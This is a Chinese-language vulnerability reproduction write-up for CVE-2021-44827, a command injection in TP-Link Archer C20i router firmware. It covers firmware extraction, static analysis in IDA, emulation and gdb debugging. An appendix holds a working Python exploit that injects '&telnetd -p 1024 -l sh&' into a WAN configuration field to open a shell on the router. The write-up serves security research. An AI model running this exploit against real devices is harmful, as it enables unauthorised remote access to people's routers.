## 漏洞编号

CVE-2021-44827

## 固件下载地址

https://www.tp-link.com/en/support/download/archer-c20i/#Firmware

## 漏洞分析调试

### 固件提取

`binwalk -Me Archer_C20iv1_0.9.1_4.0_up_boot\(160518\)_2016-05-18_09.51.09.bin` 

![image-20220414221020537](TPLINK_Archer_c20i(EU)RCE复现.assets/image-20220414221020537.png)

很顺利，可以解开

### 漏洞点

查看漏洞通告里的描述

![image-20220414222154961](TPLINK_Archer_c20i(EU)RCE复现.assets/image-20220414222154961.png)

漏油器文件系统如下：

![image-20220414222406065](TPLINK_Archer_c20i(EU)RCE复现.assets/image-20220414222406065.png)

既然是命令注入漏洞，也没有特殊说明，那应该是在web界面

使用firmwalk工具检索一下文件系统里的关键信息和敏感信息，这个工具省去了很多人力去信息搜集，当然有时候不是那么全面，可以自己稍加定制一下，例如在学习过程中遇到了其他的web服务器程序，也可以添加到工具目录下/data文件夹的webservers文件字段中等等

`./firmwalker.sh /home/iot/tools/FirmAE/firmwares/_Archer_C20iv1_0.9.1_4.0_up_boot160518_2016-05-18_09.51.09.bin.extracted/squashfs-root ./tplink_result`

![image-20220414223647637](TPLINK_Archer_c20i(EU)RCE复现.assets/image-20220414223647637.png)

![image-20220414224056809](TPLINK_Archer_c20i(EU)RCE复现.assets/image-20220414224056809.png)

web服务器文件在./usr/bin/httpd，拖进IDA分析一波，一般嵌入式设备是通过cgi传递输入到后端，搜索cgi字符串

![image-20220414224604169](TPLINK_Archer_c20i(EU)RCE复现.assets/image-20220414224604169.png)

发现它是通过cgi后面加上数字进行不同服务的调用的，搜索漏洞公告里的字符串没有找到：X_TP_ExternalIPv6Address

在路由器文件系统根目录下搜索，发现在tdpd和tmpd中匹配到了相关的字符串

`grep -r "X_TP_ExternalIPv6Address"`

![image-20220414225316264](TPLINK_Archer_c20i(EU)RCE复现.assets/image-20220414225316264.png)

老规矩，拖进IDA pro分析查找

![image-20220414225532312](TPLINK_Archer_c20i(EU)RCE复现.assets/image-20220414225532312.png)

![image-20220414230021456](TPLINK_Archer_c20i(EU)RCE复现.assets/image-20220414230021456.png)



根目录下搜索处理危险参数的函数：`grep -r rdp_setObj `

![image-20220414230250552](TPLINK_Archer_c20i(EU)RCE复现.assets/image-20220414230250552.png)

函数应该定义在动态链接库lib/libcmm.so中

### 调试环境搭建

使用debug模式运行固件，2进入命令行shell，实际上就是firmadyne提供的telnetd服务，发现并没有wget等命令，因为是用firmae模拟的固件，所以firmadyne下的busybox有wget命令，传入gdbserver

![image-20220414235233151](TPLINK_Archer_c20i(EU)RCE复现.assets/image-20220414235233151.png)



![image-20220417165805731](TPLINK_Archer_c20i(EU)RCE复现.assets/image-20220417165805731.png)

此时符合目标系统架构的gdbserver传入文件系统

### 调试

查看http进程号

![image-20220417170047618](TPLINK_Archer_c20i(EU)RCE复现.assets/image-20220417170047618.png)

`./gdbserver-7.12-mipsel-mips32rel2-v1-sysv :9999 --attach 614`

![image-20220417170203171](TPLINK_Archer_c20i(EU)RCE复现.assets/image-20220417170203171.png)

```
echo "source /home/iot/tools/gdb_plugains/gef/gef.py" > ~/.gdbinit

gdb-multiarch -q ./usr/bin/httpd

set architecture mips

set endian little

set solib-search-path lib/

target remote 192.168.0.1:9999
```



![image-20220417234232389](TPLINK_Archer_c20i(EU)RCE复现.assets/image-20220417234232389.png)

里我们可以先在rdp_getObj，rdp_setObj设置相关断点，这些函数都位于动态链接库中，并且负责数据的获取和配置操作，也就是会对上述的payload_template中的数据进行处理

```
b rdp_getObj

b rdp_setObj

info b
```

设置断点信息

![image-20220417234259384](TPLINK_Archer_c20i(EU)RCE复现.assets/image-20220417234259384.png)

使用EXP打过去，exp在附录

![image-20220417234433325](TPLINK_Archer_c20i(EU)RCE复现.assets/image-20220417234433325.png)



登录的请求直接c继续，抓取后边的post请求分布执行

按s分布执行，观察运行exp的窗口，若成功登录telnet 证明执行完成，在0x403eb8处执行成功

![image-20220417235000606](TPLINK_Archer_c20i(EU)RCE复现.assets/image-20220417235000606.png)



此漏洞是由于设置wan的时候触发命令注入，所以我们可以在动态链接库libcmm.so中查找，看到果然有

![image-20220418001050933](TPLINK_Archer_c20i(EU)RCE复现.assets/image-20220418001050933.png)

在`util_execSystem`下断点，进行调试，传入的命令是可以被拼接的

![image-20220418004703550](TPLINK_Archer_c20i(EU)RCE复现.assets/image-20220418004703550.png)





## 总结

已知漏洞，不知道触发点，采用动态调试+静态分析的方式复现，  对齐动态调试。。



## 附录

### exp

```
import requests
import base64
import os
import time
ip = input("请输入要检测的IP地址：")
username = input("请输入管理员账户：")
password = input("请输入管理员密码：")
tplink_url = "http://" + ip + "/cgi?2&2"
userinfo = username + ":" + password
cookie = "Authorization=Basic " + base64.b64encode(userinfo.encode()).decode("ascii")
referer = "http://" + ip +"/mainFrame.htm"
cmd = "telnet " + ip + " 1024"
payload_template = """[WAN_ETH_INTF#1,0,0,0,0,0#0,0,0,0,0,0]0,1\r
X_TP_lastUsedIntf=ipoe_eth3_s\r
[WAN_IP_CONN#1,1,1,0,0,0#0,0,0,0,0,0]1,21\r
externalIPAddress=192.168.9.222\r
subnetMask=255.255.255.0\r
defaultGateway=192.168.9.2\r
NATEnabled=1\r
X_TP_FullconeNATEnabled=0\r
X_TP_FirewallEnabled=1\r
X_TP_IGMPProxyEnabled=1\r
X_TP_IGMPForceVersion=0\r
maxMTUSize=1500\r
DNSOverrideAllowed=1\r
DNSServers=192.168.9.3,0.0.0.0\r
X_TP_IPv4Enabled=1\r
X_TP_IPv6Enabled=0\r
X_TP_IPv6AddressingType=Static\r
X_TP_ExternalIPv6Address=commond\r
X_TP_PrefixLength=64\r
X_TP_DefaultIPv6Gateway=::\r
X_TP_IPv6DNSOverrideAllowed=0\r
X_TP_IPv6DNSServers=::,::\r
X_TP_MLDProxyEnabled=0\r
enable=1\r
"""
payload = payload_template.replace("commond", "::")
res = requests.post(tplink_url, data=payload, headers={"Referer": referer, "Cookie": cookie})
time.sleep(5)
print("===========")
payload = payload_template.replace("commond", "&telnetd -p 1024 -l sh&")
res = requests.post(tplink_url, data=payload, headers={"Referer": referer, "Cookie": cookie})
os.system(cmd)
```





















